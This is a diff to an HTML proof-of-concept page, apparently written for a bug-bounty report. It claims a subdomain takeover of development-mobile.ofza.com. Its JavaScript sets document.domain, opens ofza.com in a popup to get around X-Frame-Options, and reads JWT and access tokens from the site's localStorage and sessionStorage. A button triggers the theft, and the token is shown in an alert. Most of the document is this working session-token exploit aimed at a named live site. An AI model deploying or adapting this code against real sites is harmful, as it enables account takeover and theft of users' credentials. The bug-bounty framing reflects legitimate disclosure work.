@@ -6,7 +6,6 @@
   <title>Critical Subdomain Takeover - wrathsec</title>
   <meta name="robots" content="noindex,nofollow">
   <style>
-    /* ... Keep all your existing CSS here ... */
     body {
       margin: 0;
       min-height: 100vh;
@@ -56,39 +55,48 @@
       color: #58a6ff;
       text-decoration: none;
     }
-    a:hover {
-      text-decoration: underline;
-    }
+    a:hover { text-decoration: underline; }
     .signature {
       margin-top: 20px;
       font-weight: 600;
       color: #3fb950;
     }
-    /* Adding a status pulse for effect */
     .status-pulse {
       color: #f85149;
       font-weight: bold;
       animation: blink 2s infinite;
     }
     @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    
+    /* Exploit Trigger Button */
+    .exploit-btn {
+      display: block;
+      width: 100%;
+      margin-top: 20px;
+      padding: 12px;
+      background: #238636;
+      color: white;
+      border: 1px solid rgba(240, 246, 252, 0.1);
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .exploit-btn:hover { background: #2ea043; }
   </style>
 </head>
 <body>
   <main class="card">
     <div class="badge">Critical Vulnerability Verified</div>
     <h1>Subdomain Takeover & SOP Bypass</h1>
-    <p>This PoC demonstrates <strong>Cross-Domain Data Extraction</strong> via <code>document.domain</code> synchronization.</p>
+    <p>This PoC demonstrates <strong>Cross-Domain JWT Extraction</strong> bypassing <code>X-Frame-Options</code> via popup synchronization.</p>
     
     <div class="info-box">
       <p>Target Host: <code>development-mobile.ofza.com</code></p>
       <p>Researcher: <code>wrathsec</code></p>
-      <p>Exploit Type: <code>Full Account Takeover (ATO)</code></p>
+      <p>Exploit Type: <code>JWT Extraction / Full ATO</code></p>
       <p>Impact: <span class="status-pulse">Bypassing Same-Origin Policy...</span></p>
-      <p>Researcher Profile: 
-        <a href="https://hackenproof.com/hackers/wrathsec" target="_blank">
-          https://hackenproof.com/hackers/wrathsec
-        </a>
-      </p>
+      <button class="exploit-btn" onclick="runExploit()">Verify Full Account Takeover</button>
     </div>
 
     <p class="signature">
@@ -99,48 +107,46 @@
 
   <script>
     /**
-     * EXPLOIT ENGINE - WRATHSEC
-     * Targeted at ofza.com JWT Extraction
+     * EXPLOIT ENGINE v2 (Popup Bypass) - WRATHSEC
+     * Bypasses X-Frame-Options: SAMEORIGIN
      */
 
-    // 1. Align security origin with the parent domain
+    // 1. Sync domain to parent to allow cross-window access
     document.domain = "ofza.com";
 
-    // 2. Create invisible bridge to the authenticated main site
-    const bridge = document.createElement('iframe');
-    bridge.src = "https://ofza.com"; 
-    bridge.style.display = "none";
-    document.body.appendChild(bridge);
+    function runExploit() {
+        // 2. Open the main site in a popup (Not blocked by X-Frame-Options)
+        // We open it in a small window that will be accessed by this script
+        const targetWin = window.open("https://ofza.com/en", "exploit_win", "width=400,height=400");
 
-    bridge.onload = function() {
-        try {
-            // 3. Access the main site's LocalStorage/SessionStorage
-            const targetStorage = bridge.contentWindow.localStorage;
-            const targetSession = bridge.contentWindow.sessionStorage;
+        // 3. Wait for the popup to load and settle
+        setTimeout(() => {
+            try {
+                // 4. Access the popup's storage directly
+                // This is allowed because both windows have document.domain = "ofza.com"
+                const storage = targetWin.localStorage;
+                const jwt = storage.getItem('token') || 
+                            storage.getItem('access_token') || 
+                            targetWin.sessionStorage.getItem('Authorization');
 
-            // Common keys for JWT/Auth tokens
-            const jwt = targetStorage.getItem('token') || 
-                        targetStorage.getItem('access_token') || 
-                        targetSession.getItem('Authorization');
-
-            if (jwt) {
-                // 4. Trigger the "Critical" Evidence Alert
-                alert(
-                    "⚠️ CRITICAL: ACCOUNT TAKEOVER PROVED\n" +
-                    "------------------------------------------\n" +
-                    "Researcher: wrathsec\n" +
-                    "Proof: Same-Origin Policy (SOP) Bypassed\n\n" +
-                    "Successfully Extracted JWT Token:\n" + jwt + "\n\n" +
-                    "Note: This token grants full access to the victim's account via api.ofza.com. " +
-                    "The extraction is silent and requires zero user interaction."
-                );
-            } else {
-                console.log("SOP Bypass confirmed, but no active session found. Log in to ofza.com to verify extraction.");
+                if (jwt) {
+                    alert(
+                        "⚠️ CRITICAL: ACCOUNT TAKEOVER PROVED\n" +
+                        "------------------------------------------\n" +
+                        "Researcher: wrathsec\n\n" +
+                        "Full JWT Extracted from ofza.com:\n" + jwt + "\n\n" +
+                        "The presence of this token confirms full impersonation capability."
+                    );
+                    targetWin.close(); // Clean up
+                } else {
+                    alert("SOP Bypass Successful, but no active session found. Please log in to ofza.com and try again.");
+                }
+            } catch (e) {
+                alert("Exploit Error: Access Denied. Ensure you are logged in to ofza.com and that the site sets document.domain correctly.");
+                console.error(e);
             }
-        } catch (e) {
-            console.error("Exploit Error: Main site may not have document.domain set or same-site headers are blocking iframe.");
-        }
-    };
+        }, 4000); // 4 seconds to ensure full load
+    }
   </script>
 </body>
 </html>
